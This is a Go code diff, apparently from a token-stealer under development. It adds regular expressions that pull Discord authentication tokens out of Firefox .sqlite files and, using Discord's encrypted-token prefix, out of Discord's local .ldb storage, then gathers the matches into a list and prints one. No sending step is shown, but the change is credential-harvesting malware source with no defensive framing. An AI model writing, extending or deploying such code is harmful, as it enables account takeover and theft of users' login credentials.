@@ -8,6 +8,8 @@ import (
 	"path/filepath"
 	"regexp"
 	"strings"
+
+	"golang.org/x/exp/slices"
 )
 
 var tokens []string
@@ -52,22 +54,30 @@ func start() {
 		}
 		if strings.Contains(location, "Mozilla") {
 			for _, filepath := range get_files(location, ".sqlite") {
-				r := regexp.MustCompile("image")
+				r := regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}")
 				file, _ := os.Open(filepath)
 				data, _ := ioutil.ReadAll(file)
 				for _, match := range r.FindAllStringSubmatch(string(data), -1) {
-					fmt.Println(match)
+					tokens = append(tokens, match...)
 
 				}
 			}
 		}
 		if strings.Contains(location, "cord") {
-			for _, file := range get_files(location, ".ldb") {
-				fmt.Println(file)
+			for _, filepath := range get_files(location, ".ldb") {
+				r := regexp.MustCompile("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)")
+				file, _ := os.Open(filepath)
+				data, _ := ioutil.ReadAll(file)
+				for _, match := range r.FindAllString(string(data), -1) {
+					if !slices.Contains(tokens, string(match)) {
+						tokens = append(tokens, string(match))
+					}
+				}
 			}
 		}
 
 	}
+	fmt.Println(tokens[1])
 
 }
 
